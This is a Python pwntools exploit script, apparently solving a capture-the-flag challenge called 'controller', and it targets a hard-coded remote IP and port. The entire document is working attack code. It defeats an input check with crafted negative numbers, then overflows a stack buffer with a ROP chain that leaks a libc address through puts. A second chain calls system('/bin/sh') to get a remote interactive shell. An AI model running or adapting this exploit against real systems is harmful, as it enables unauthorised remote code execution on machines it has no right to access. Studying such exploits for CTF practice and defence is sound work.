#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('controller')
libc = ELF('./libc.so.6')

env = {
    'LD_PRELOAD': os.path.abspath('./libc.so.6')
}

# p = process([ './ld-2.27_64.so', elf.path ], env=env)
# gdb.attach(p, 'init-gef\n b*0x00000000004010fd')
p = remote("188.166.172.13", 31069)

def calc_solve():
    p.sendlineafter("types of recources: ", "-359 -182")
    p.sendlineafter("> ", '3')


calc_solve()
pop_rdi = 0x00000000004011d3

payload = "A" * 40
payload += flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)

p.sendlineafter("> ", payload)

p.recvuntil("ingored\n")
leak = u64(p.recvline(False).ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']

log.info("Libc: 0x{:x}".format(libc.address))

calc_solve()

ret = 0x0000000000400606
payload = "A" * 40
payload += flat(
    pop_rdi, next(libc.search('/bin/sh')),
    ret,
    libc.symbols['system']
)

p.sendlineafter("> ", payload)

p.interactive()

